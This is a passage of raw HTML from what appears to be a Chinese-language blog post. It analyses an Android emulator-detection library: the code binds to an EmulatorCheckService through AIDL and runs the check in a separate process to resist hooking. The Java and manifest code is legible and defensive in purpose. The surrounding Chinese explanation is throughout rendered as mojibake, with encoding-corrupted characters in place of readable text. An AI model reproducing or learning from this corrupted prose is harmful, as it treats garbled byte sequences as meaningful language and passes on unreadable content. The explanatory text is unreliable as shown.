&#125;</span><br><span class="line">        &#125;));</span><br></pre></td></tr></table></figure><p><strong><code>binding.btnAsyncSimu.setOnClickListener(...)</code></strong></p><ul><li>ä¸ºå¸ƒå±€æ–‡ä»¶ä¸­ ID ä¸º <code>btn_async_simu</code> çš„æŒ‰é’®è®¾ç½®ä¸€ä¸ªç‚¹å‡»äº‹ä»¶ç›‘å¬å™¨<ul><li>å¸ƒå±€æ–‡ä»¶<code>app\src\main\res\layout\activity_main.xml</code></li></ul></li><li>å½“ç”¨æˆ·ç‚¹å‡»è¿™ä¸ªæŒ‰é’®æ—¶ï¼Œç›‘å¬å™¨å†…éƒ¨çš„ä»£ç ä¼šè¢«æ‰§è¡Œ</li></ul><p>ç‚¹å‡»äº‹ä»¶è§¦å‘åï¼Œä¼šè°ƒç”¨ <code>EmuCheckUtil.checkEmulatorFromCache()</code> æ–¹æ³•ã€‚è¿™ä¸ªæ–¹æ³•æ˜¯æ•´ä¸ªåŠŸèƒ½çš„æ ¸å¿ƒ</p><h4 id="checkEmulatorFromCache"><a href="#checkEmulatorFromCache" class="headerlink" title="checkEmulatorFromCache"></a>checkEmulatorFromCache</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">checkEmulatorFromCache</span><span class="params">(<span class="keyword">final</span> Context context, <span class="meta">@NonNull</span> <span class="keyword">final</span> EmuCheckUtil.CheckEmulatorCallBack callBack)</span> &#123;</span><br><span class="line">    <span class="comment">// 1. åˆ›å»ºä¸€ä¸ª Intent æ¥æ ‡è¯†ç›®æ ‡æœåŠ¡ã€‚</span></span><br><span class="line">    <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(context, EmulatorCheckService.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. ç»‘å®šåˆ°æœåŠ¡ã€‚</span></span><br><span class="line">    context.bindService(intent, <span class="keyword">new</span> <span class="title class_">ServiceConnection</span>() &#123;</span><br><span class="line">        <span class="comment">// è¿™ä¸ªåŒ¿åç±»å¤„ç†è¿æ¥çš„ç”Ÿå‘½å‘¨æœŸã€‚</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. è¿æ¥å»ºç«‹æ—¶è°ƒç”¨ã€‚</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onServiceConnected</span><span class="params">(ComponentName name, IBinder service)</span> &#123;</span><br><span class="line">            <span class="comment">// 4. å°†åŸå§‹ IBinder è½¬æ¢ä¸º AIDL æ¥å£ã€‚</span></span><br><span class="line">            <span class="type">IEmulatorCheck</span> <span class="variable">IEmulatorCheck</span> <span class="operator">=</span> com.snail.antifake.IEmulatorCheck.Stub.asInterface(service);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (IEmulatorCheck != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 5. è¿›è¡Œè¿œç¨‹è°ƒç”¨å¹¶ä¼ é€’ç»“æœã€‚</span></span><br><span class="line">                    callBack.onCheckSuccess(IEmulatorCheck.isEmulator());</span><br><span class="line">                    <span class="comment">// 6. è·å–ç»“æœåè§£é™¤ä¸æœåŠ¡çš„ç»‘å®šã€‚</span></span><br><span class="line">                    context.unbindService(<span class="built_in">this</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (RemoteException var5) &#123;</span><br><span class="line">                    <span class="comment">// 7. å¤„ç†é€šä¿¡é”™è¯¯ã€‚</span></span><br><span class="line">                    callBack.onCheckFaild();</span><br><span class="line">                    context.unbindService(<span class="built_in">this</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 8. å¦‚æœè¿æ¥æ„å¤–ä¸¢å¤±æ—¶è°ƒç”¨ã€‚</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onServiceDisconnected</span><span class="params">(ComponentName name)</span> &#123;</span><br><span class="line">            <span class="comment">// æ­¤å®ç°ä¸æ‰§è¡Œä»»ä½•æ“ä½œï¼Œä½†å¯ç”¨äºæ¸…ç†æˆ–é‡è¯•é€»è¾‘ã€‚</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, BIND_AUTO_CREATE); <span class="comment">// 9. å¦‚æœæœåŠ¡æœªè¿è¡Œï¼Œåˆ™è‡ªåŠ¨åˆ›å»ºæœåŠ¡çš„æ ‡å¿—ã€‚</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>è¯¦ç»†åˆ†æï¼š</strong></p><ol><li>ä¸€å¼€å§‹å…ˆåˆ›å»ºäº†ä¸€ä¸ªæ˜¾å¼ <code>Intent</code>ã€‚<strong>è¿™ç§ç±»å‹çš„ Intent ç”¨äºåº”ç”¨ç¨‹åºå†…éƒ¨é€šä¿¡</strong>ã€‚å®ƒæ˜ç¡®æŒ‡æ˜äº†<strong>ç›®çš„åœ°</strong>ï¼š<code>EmulatorCheckService</code></li><li><code>context.bindService</code> å¯åŠ¨ä¸ <code>intent</code> æŒ‡å®šçš„æœåŠ¡çš„è¿æ¥ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯<code>ServiceConnection</code> çš„å®ä¾‹ï¼Œè¿™æ˜¯ä¸€ä¸ªç”¨äº<strong>ç›‘è§†è¿æ¥çŠ¶æ€çš„æ¥å£</strong>ã€‚è¿™é‡Œï¼Œå®ƒè¢«å®ç°ä¸ºä¸€ä¸ª<strong>åŒ¿åå†…éƒ¨ç±»</strong></li><li>å½“ä¸ <code>EmulatorCheckService</code> çš„è¿æ¥æˆåŠŸå»ºç«‹åï¼ŒAndroid ç³»ç»Ÿä¼šè°ƒç”¨æ­¤å›è°ƒæ–¹æ³•ã€‚å®ƒæ¥æ”¶ä¸€ä¸ª <code>IBinder</code> å¯¹è±¡ï¼Œå®ƒæ˜¯ä¸è¿œç¨‹æœåŠ¡çš„<strong>åŸå§‹é€šä¿¡é€šé“</strong></li><li><code>IEmulatorCheck</code> æ¥å£åœ¨ <code>.aidl</code> æ–‡ä»¶ä¸­å®šä¹‰ã€‚é™æ€æ–¹æ³• <code>asInterface()</code> æ¥æ”¶æ¥è‡ªæœåŠ¡çš„é€šç”¨ <code>IBinder</code> å¹¶å°†å…¶è½¬æ¢ä¸ºå®¢æˆ·ç«¯ä»£ç†å¯¹è±¡ (<code>IEmulatorCheck</code>)ã€‚è¿™ä¸ªä»£ç†å¯¹è±¡å…·æœ‰ä¸è¿œç¨‹æœåŠ¡æ¥å£ç›¸åŒçš„æ–¹æ³•ï¼ˆä¾‹å¦‚ <code>isEmulator()</code>ï¼‰ï¼Œ<strong>å…è®¸å®¢æˆ·ç«¯åƒè°ƒç”¨æœ¬åœ°æ–¹æ³•ä¸€æ ·è°ƒç”¨å®ƒä»¬</strong></li><li>ä»£ç ç°åœ¨åœ¨ä»£ç†å¯¹è±¡ä¸Šè°ƒç”¨ <code>isEmulator()</code> æ–¹æ³•ã€‚è¿™ä¼šè§¦å‘ IPC æœºåˆ¶ï¼šæ–¹æ³•è°ƒç”¨åŠå…¶å‚æ•°è¢«â€œç¼–ç»„â€ï¼ˆ<strong>åºåˆ—åŒ–</strong>ï¼‰ï¼Œè·¨è¿›ç¨‹è¾¹ç•Œå‘é€åˆ° <code>EmulatorCheckService</code>ï¼Œå¹¶åœ¨é‚£é‡Œæ‰§è¡Œã€‚æ¥è‡ªæœåŠ¡çš„å¸ƒå°”ç»“æœéšåè¢«â€œè§£ç»„â€å¹¶è¿”å›åˆ°æ­¤å¤„</li><li>æˆåŠŸè·å–ç»“æœåï¼Œ<strong>å®¢æˆ·ç«¯è§£é™¤ä¸æœåŠ¡çš„ç»‘å®š</strong>ã€‚è¿™å¯¹äºèµ„æºç®¡ç†è‡³å…³é‡è¦ã€‚ç”±äºæœåŠ¡å¯èƒ½æ˜¯é€šè¿‡ <code>BIND_AUTO_CREATE</code> å¯åŠ¨çš„ï¼Œä¸€æ—¦æ‰€æœ‰å®¢æˆ·ç«¯éƒ½è§£é™¤ç»‘å®šï¼Œç³»ç»Ÿå°†è‡ªåŠ¨é”€æ¯å®ƒ</li><li>å¦‚æœæœåŠ¡è¿›ç¨‹å´©æºƒæˆ–è¢«ç»ˆæ­¢ï¼Œå¯¹è¿œç¨‹æœåŠ¡çš„è°ƒç”¨å¯èƒ½ä¼šå¤±è´¥ã€‚æ­¤ç±»æ•…éšœä¼šæŠ›å‡º <code>RemoteException</code></li><li>æ­¤æ–¹æ³•ä»…åœ¨æ„å¤–æ–­å¼€è¿æ¥ï¼ˆä¾‹å¦‚æœåŠ¡è¿›ç¨‹å´©æºƒï¼‰æ—¶è°ƒç”¨</li><li>**<code>BIND_AUTO_CREATE</code>**æ­¤æ ‡å¿—å‘Šè¯‰ <code>bindService</code> å¦‚æœæœåŠ¡å°šæœªè¿è¡Œåˆ™åˆ›å»ºå®ƒ</li></ol><blockquote><p><strong>ä»€ä¹ˆæ˜¯ AIDLï¼Ÿ</strong></p><p>AIDL å…¨ç§°æ˜¯ <strong>Android Interface Definition Language</strong>ï¼Œå³ <strong>Android æ¥å£å®šä¹‰è¯­è¨€</strong>ã€‚</p><p>å®ƒæ˜¯ä¸€ç§ <strong>IPC (Inter-Process Communicationï¼Œè¿›ç¨‹é—´é€šä¿¡)</strong> æœºåˆ¶ã€‚å½“ä½ çš„ Android åº”ç”¨éœ€è¦ä¸å¦ä¸€ä¸ªåº”ç”¨æˆ–æœåŠ¡ï¼ˆå°¤å…¶æ˜¯åœ¨ä¸åŒè¿›ç¨‹ä¸­è¿è¡Œçš„æœåŠ¡ï¼‰è¿›è¡Œé€šä¿¡æ—¶ï¼Œå°±éœ€è¦ä¸€ç§åŒæ–¹éƒ½èƒ½ç†è§£çš„â€œåè®®â€æ¥ä¼ é€’æ•°æ®å’Œè°ƒç”¨æ–¹æ³•ã€‚<strong>AIDL å°±æ˜¯ç”¨æ¥å®šä¹‰è¿™ä¸ªåè®®çš„å·¥å…·</strong>ã€‚</p><p>å®ƒçš„å·¥ä½œæµç¨‹å¤§è‡´å¦‚ä¸‹ï¼š</p><ol><li><strong>å®šä¹‰æ¥å£</strong>ï¼šä½ ä½¿ç”¨ç±»ä¼¼ Java æ¥å£çš„è¯­æ³•åœ¨ä¸€ä¸ª <code>.aidl</code> æ–‡ä»¶ä¸­å£°æ˜ä¸€ä¸ªæ¥å£ï¼ŒåŒ…æ‹¬ä½ æƒ³<strong>æš´éœ²ç»™å®¢æˆ·ç«¯è°ƒç”¨çš„æ–¹æ³•</strong>ã€‚</li><li><strong>ç”Ÿæˆä»£ç </strong>ï¼šAndroid SDK å·¥å…·ä¼šå¤„ç†è¿™ä¸ª <code>.aidl</code> æ–‡ä»¶ï¼Œå¹¶è‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªåŒåçš„ Java æ¥å£æ–‡ä»¶ã€‚è¿™ä¸ªæ–‡ä»¶ä¸­åŒ…å«ä¸€ä¸ªåä¸º <code>Stub</code> çš„æŠ½è±¡å†…éƒ¨ç±»ï¼Œå®ƒå®ç°äº†æ¥å£å¹¶å¤„ç†äº†æ‰€æœ‰è¿œç¨‹è°ƒç”¨çš„ç»†èŠ‚ã€‚</li><li><strong>æœåŠ¡ç«¯å®ç°</strong>ï¼šæœåŠ¡ï¼ˆServiceï¼‰éœ€è¦åˆ›å»ºä¸€ä¸ª <code>Stub</code> ç±»çš„å®ä¾‹ï¼Œå¹¶å®ç°ä½ åœ¨ <code>.aidl</code> æ–‡ä»¶ä¸­å®šä¹‰çš„æ–¹æ³•ã€‚<code>Service</code> çš„ <code>onBind()</code> æ–¹æ³•ä¼šè¿”å›è¿™ä¸ª <code>Stub</code> å®ä¾‹ã€‚</li><li><strong>å®¢æˆ·ç«¯è°ƒç”¨</strong>ï¼šå®¢æˆ·ç«¯åœ¨ <code>onServiceConnected()</code> å›è°ƒä¸­æ¥æ”¶åˆ°ä¸€ä¸ª <code>IBinder</code> å¯¹è±¡ã€‚é€šè¿‡è°ƒç”¨ <code>YourInterface.Stub.asInterface(binder)</code>ï¼Œå®¢æˆ·ç«¯å¯ä»¥å¾—åˆ°ä¸€ä¸ªæ¥å£çš„ä»£ç†å¯¹è±¡ã€‚ä¹‹åï¼Œå®¢æˆ·ç«¯å°±å¯ä»¥åƒè°ƒç”¨æœ¬åœ°æ–¹æ³•ä¸€æ ·è°ƒç”¨è¿™ä¸ªä»£ç†å¯¹è±¡çš„æ–¹æ³•ï¼Œè€Œ Android ç³»ç»Ÿä¼šåœ¨åº•å±‚å¤„ç†æ‰€æœ‰è·¨è¿›ç¨‹çš„æ•°æ®æ‰“åŒ…ï¼ˆç¼–ç»„ï¼‰ã€ä¼ è¾“å’Œè§£åŒ…ï¼ˆè§£ç»„ï¼‰å·¥ä½œã€‚</li></ol><p><strong>ä¸ºä»€ä¹ˆè¿™é‡Œä½¿ç”¨ AIDL è€Œä¸æ˜¯æ›´ç®€å•çš„æ–¹æ³•ï¼Ÿ</strong></p><p>æŸ¥çœ‹é¡¹ç›®ä¸­çš„ <code>AndroidManifest.xml</code> æ–‡ä»¶</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">service</span> <span class="attr">android:name</span>=<span class="string">&quot;.jni.EmulatorCheckService&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">android:process</span>=<span class="string">&quot;:EmulatorCheckService&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>å…³é”®åœ¨äº <code>android:process=&quot;:EmulatorCheckService&quot;</code> è¿™ä¸€è¡Œã€‚</p><p>å±æ€§å€¼å‰é¢çš„å†’å· (<code>:</code>) è¡¨ç¤ºè¿™ä¸ª Service å°†ä¼šè¿è¡Œåœ¨ä¸€ä¸ª<strong>ç§æœ‰çš„ã€ç‹¬ç«‹çš„è¿›ç¨‹</strong>ä¸­ï¼Œè¿›ç¨‹åæ˜¯ <code>ä½ çš„åº”ç”¨åŒ…å:EmulatorCheckService</code></p><p><strong>æ—¢ç„¶æ£€æµ‹é€»è¾‘è¢«åˆ»æ„æ”¾åˆ°äº†ä¸€ä¸ªç‹¬ç«‹çš„è¿›ç¨‹ä¸­ï¼Œé‚£ä¹ˆä¸»åº”ç”¨è¿›ç¨‹ä¸è¿™ä¸ªæœåŠ¡è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡å°±å¿…é¡»ä½¿ç”¨ IPC æœºåˆ¶ã€‚</strong> AIDL æ˜¯ Android å®˜æ–¹æä¾›çš„ã€åŠŸèƒ½å¼ºå¤§ä¸”é«˜æ•ˆçš„ IPC æ–¹å¼ä¹‹ä¸€ï¼Œå› æ­¤è¢«é€‰ç”¨</p><p><strong>æé«˜å®‰å…¨æ€§ï¼Œé˜²æ­¢ Hook</strong>ï¼š</p><p><strong>Hook å·¥å…·é€šå¸¸æ˜¯æ³¨å…¥åˆ°ç›®æ ‡åº”ç”¨çš„ä¸»è¿›ç¨‹é‡Œ</strong>ï¼Œå®ƒä»¬æ— æ³•ç›´æ¥å½±å“åˆ°å¦ä¸€ä¸ªç‹¬ç«‹çš„ <code>EmulatorCheckService</code> è¿›ç¨‹ã€‚æ”»å‡»è€…å¦‚æœæƒ³ç ´è§£ï¼Œå°±å¿…é¡»è®¾æ³•å» Hook è¿™ä¸ªæ–°çš„æœåŠ¡è¿›ç¨‹ï¼Œæ“ä½œæ›´å¤æ‚ï¼Œä»è€Œæœ‰æ•ˆåœ°æå‡äº†åä½œå¼Šçš„é—¨æ§›ã€‚</p></blockquote><blockquote><p><strong>å¼‚æ­¥æ€§</strong>: æ£€æŸ¥ä¸ä¼šé˜»å¡ä¸»çº¿ç¨‹ï¼Œç¡®ä¿æµç•…çš„ç”¨æˆ·ä½“éªŒã€‚</p><p><strong>éš”ç¦»æ€§</strong>: é€šè¿‡åœ¨å•ç‹¬çš„è¿›ç¨‹ä¸­è¿è¡Œæ£€æŸ¥ï¼Œä½¿å¾—æ¶æ„å·¥å…·ï¼ˆå¦‚ Hook æ¡†æ¶ï¼‰æ›´éš¾ä»åº”ç”¨ç¨‹åºçš„ä¸»è¿›ç¨‹ä¸­ç¯¡æ”¹æ£€æµ‹é€»è¾‘ã€‚</p></blockquote><h4 id="EmulatorCheckService"><a href="#EmulatorCheckService" class="headerlink" title="EmulatorCheckService"></a>EmulatorCheckService</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">callBack.onCheckSuccess(IEmulatorCheck.isEmulator());</span><br></pre></td></tr></table></figure><p>æ­¤å¤„è°ƒç”¨<code>isEmulator</code>å‡½æ•°ï¼Œä¼šè§¦å‘IPCæœºåˆ¶</p><blockquote><p>ä¸ºä»€ä¹ˆæ‰§è¡Œå®ƒå°±æ˜¯æ‰§è¡ŒEmulatorCheckServiceçš„isEmulatorå‡½æ•°ï¼Ÿ</p><p>è°ƒç”¨ <code>AIDL</code> æ¥å£çš„ <code>isEmulator()</code> æ–¹æ³•ä¹‹æ‰€ä»¥ä¼šæ‰§è¡Œ <code>EmulatorCheckService</code> ä¸­çš„ <code>isEmulator()</code> æ–¹æ³•ï¼Œæ˜¯å› ä¸º Android ç³»ç»Ÿåœ¨èƒŒåä¸ºä½ æ„å»ºäº†ä¸€åº§â€œé€šä¿¡æ¡¥æ¢â€ã€‚è¿™ä¸ªæ¡¥æ¢ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼šå®¢æˆ·ç«¯çš„ <strong>ä»£ç†ï¼ˆProxyï¼‰</strong> å’ŒæœåŠ¡ç«¯çš„ <strong>å­˜æ ¹ï¼ˆStubï¼‰</strong></p><p>å½“ä½ ç¼–è¯‘é¡¹ç›®æ—¶ï¼ŒAndroid æ„å»ºå·¥å…·ä¼šæ‰¾åˆ° <code>IEmulatorCheck.aidl</code> æ–‡ä»¶ï¼Œå¹¶è‡ªåŠ¨ç”Ÿæˆä¸€ä¸ª <code>IEmulatorCheck.java</code> æ–‡ä»¶ã€‚è¿™ä¸ªè‡ªåŠ¨ç”Ÿæˆçš„æ–‡ä»¶åŒ…å«äº†æ‰€æœ‰å®ç°è·¨è¿›ç¨‹é€šä¿¡æ‰€éœ€è¦çš„â€œèƒ¶æ°´ä»£ç â€</p><p>åœ¨ <code>EmulatorCheckService.java</code> ä¸­ï¼Œåˆ›å»ºäº†ä¸€ä¸ª <code>IEmulatorCheck.Stub</code> çš„åŒ¿åå†…éƒ¨ç±»å®ä¾‹ï¼Œå¹¶å®ç°äº† <code>isEmulator()</code> æ–¹æ³•</p><p>å½“æœåŠ¡å¯åŠ¨å¹¶è¢«ç»‘å®šæ—¶ï¼Œè¿™ä¸ª <code>Stub</code> å¯¹è±¡ï¼ˆå®ƒæœ¬èº«å°±æ˜¯ä¸€ä¸ª <code>IBinder</code>ï¼‰è¢« Android ç³»ç»Ÿä¼ é€’ç»™äº†å®¢æˆ·ç«¯</p><p>è¿™é‡Œçš„ <code>Stub.asInterface(service)</code> æ–¹æ³•åšäº†ä»€ä¹ˆï¼Ÿ</p><ul><li>å®ƒæ£€æŸ¥å‘ç°å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¸åœ¨åŒä¸€ä¸ªè¿›ç¨‹ã€‚</li><li>äºæ˜¯ï¼Œå®ƒåˆ›å»ºå¹¶è¿”å›äº†ä¸€ä¸ª <code>IEmulatorCheck.Stub.Proxy</code> å¯¹è±¡ã€‚è¿™ä¸ª <code>Proxy</code> å¯¹è±¡æŒæœ‰äº†æŒ‡å‘æœåŠ¡ç«¯ <code>Binder</code> çš„å¼•ç”¨ã€‚</li></ul><p>æ‰€ä»¥ï¼Œ<strong>AIDL æ¥å£æœ¬èº«åªæ˜¯ä¸€ä¸ªçº¦å®šï¼Œè€Œè‡ªåŠ¨ç”Ÿæˆçš„ <code>Proxy</code> å’Œ <code>Stub</code> ç±»æ‰æ˜¯å®ç°è¿™ä¸ªçº¦å®šçš„â€œå·¥åŒ â€ï¼Œå®ƒä»¬è”æ‰‹å®Œæˆäº†æ‰€æœ‰å¤æ‚çš„è·¨è¿›ç¨‹é€šä¿¡å·¥ä½œï¼Œè®©ä½ æ„Ÿè§‰å°±åƒåœ¨è°ƒç”¨ä¸€ä¸ªæœ¬åœ°æ–¹æ³•ä¸€æ ·ç®€å•ã€‚</strong></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EmulatorCheckService</span> <span class="keyword">extends</span> <span class="title class_">Service</span> &#123;</span><br><span class="line"></span><br><span class="line">    Handler mHandler=<span class="keyword">new</span> <span class="title class_">Handler</span>();</span><br><span class="line">    <span class="meta">@Nullable</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> IBinder <span class="title function_">onBind</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">IEmulatorCheck</span>.Stub() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmulator</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">                <span class="keyword">return</span> EmulatorDetectUtil.isEmulator(EmulatorCheckService.<span class="built_in">this</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">kill</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">                stopSelf();</span><br><span class="line">                mHandler.postDelayed(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                       System.exit(<span class="number">0</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,<span class="number">500</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onDestroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onDestroy();</span><br><span class="line">        Process.killProcess(Process.myPid());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>EmulatorCheckService</code> æ˜¯ä¸€ä¸ªæ ‡å‡†çš„ Android <code>Service</code>ã€‚å®ƒçš„ç‰¹æ®Šä¹‹å¤„åœ¨äºï¼Œé€šè¿‡åœ¨ <code>AndroidManifest.xml</code> æ–‡ä»¶ä¸­çš„é…ç½®ï¼Œå®ƒè¿è¡Œåœ¨ä¸€ä¸ª<strong>ç‹¬ç«‹çš„ç§æœ‰è¿›ç¨‹</strong>ä¸­</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">service</span> <span class="attr">android:name</span>=<span class="string">&quot;.jni.EmulatorCheckService&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">android:process</span>=<span class="string">&quot;:EmulatorCheckService&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p><code>onBind(Intent intent)</code> æ–¹æ³•</p><ul><li><strong>ä½œç”¨</strong>ï¼šè¿™æ˜¯ <code>Service</code> ä¸å®¢æˆ·ç«¯ï¼ˆ<code>EmuCheckUtil</code>ï¼‰å»ºç«‹è¿æ¥çš„å…¥å£ç‚¹ã€‚å½“å®¢æˆ·ç«¯è°ƒç”¨ <code>bindService()</code> æ—¶ï¼ŒAndroid ç³»ç»Ÿä¼šè°ƒç”¨è¿™ä¸ªæ–¹æ³•ã€‚</li><li><strong>è¿”å›å€¼</strong>ï¼šå®ƒå¿…é¡»è¿”å›ä¸€ä¸ª <code>IBinder</code> å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡æ˜¯å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ä¹‹é—´é€šä¿¡çš„æ¡¥æ¢ã€‚</li><li><strong>å®ç°æ–¹å¼</strong>ï¼šè¿™é‡Œç›´æ¥è¿”å›äº†ä¸€ä¸ª <code>new IEmulatorCheck.Stub() &#123; ... &#125;</code> çš„åŒ¿åå†…éƒ¨ç±»å®ä¾‹ã€‚<code>IEmulatorCheck.Stub</code> æ˜¯ç”± AIDL å·¥å…·æ ¹æ® <code>IEmulatorCheck.aidl</code> æ–‡ä»¶è‡ªåŠ¨ç”Ÿæˆçš„ã€‚æˆ‘ä»¬åœ¨è¿™é‡Œç»§æ‰¿ <code>Stub</code> ç±»å¹¶å®ç°å…¶æŠ½è±¡æ–¹æ³•ï¼Œè¿™å°±æ„æˆäº† AIDL çš„<strong>æœåŠ¡ç«¯å®ç°</strong>ã€‚</li></ul><p><code>isEmulator()</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmulator</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="keyword">return</span> EmulatorDetectUtil.isEmulator(EmulatorCheckService.<span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><strong>ä½œç”¨</strong>ï¼šè¿™æ˜¯å¯¹ AIDL æ¥å£ä¸­ <code>isEmulator()</code> æ–¹æ³•çš„å…·ä½“å®ç°ã€‚å½“å®¢æˆ·ç«¯çš„ä»£ç†å¯¹è±¡è°ƒç”¨ <code>isEmulator()</code> æ—¶ï¼Œç»è¿‡ä¸€ç³»åˆ—çš„ IPCï¼ˆè¿›ç¨‹é—´é€šä¿¡ï¼‰æµç¨‹ï¼Œæœ€ç»ˆä¼šæ‰§è¡Œåˆ°è¿™é‡Œçš„ä»£ç ã€‚</p></li><li><p><strong>æ ¸å¿ƒé€»è¾‘</strong>ï¼šå®ƒæ²¡æœ‰è‡ªå·±å®ç°æ£€æµ‹é€»è¾‘ï¼Œè€Œæ˜¯ç›´æ¥è°ƒç”¨äº† <code>EmulatorDetectUtil.isEmulator()</code>ã€‚</p></li><li><p><strong>å…³é”®ç‚¹</strong>ï¼šå› ä¸º <code>EmulatorCheckService</code> è¿è¡Œåœ¨ç‹¬ç«‹çš„è¿›ç¨‹ä¸­</p><p>æ‰€ä»¥ <code>EmulatorDetectUtil.isEmulator()</code> è¿™ä¸ªè°ƒç”¨ï¼ˆä»¥åŠå®ƒå†…éƒ¨çš„ native æ–¹æ³• <code>detectS()</code>ï¼‰ä¹Ÿ<strong>å‘ç”Ÿåœ¨è¿™ä¸ªç‹¬ç«‹è¿›ç¨‹ä¸­</strong>ã€‚è¿™å°±è¾¾åˆ°äº†å°†æ£€æµ‹é€»è¾‘ä¸ä¸»åº”ç”¨è¿›ç¨‹éš”ç¦»çš„ç›®çš„ï¼Œæå¤§åœ°å¢åŠ äº† Hook æ”»å‡»çš„éš¾åº¦ã€‚</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//antifake\src\main\java\com\snail\antifake\jni\EmulatorDetectUtil.java</span></span><br><span class="line">....</span><br><span class="line"><span class="keyword">static</span> 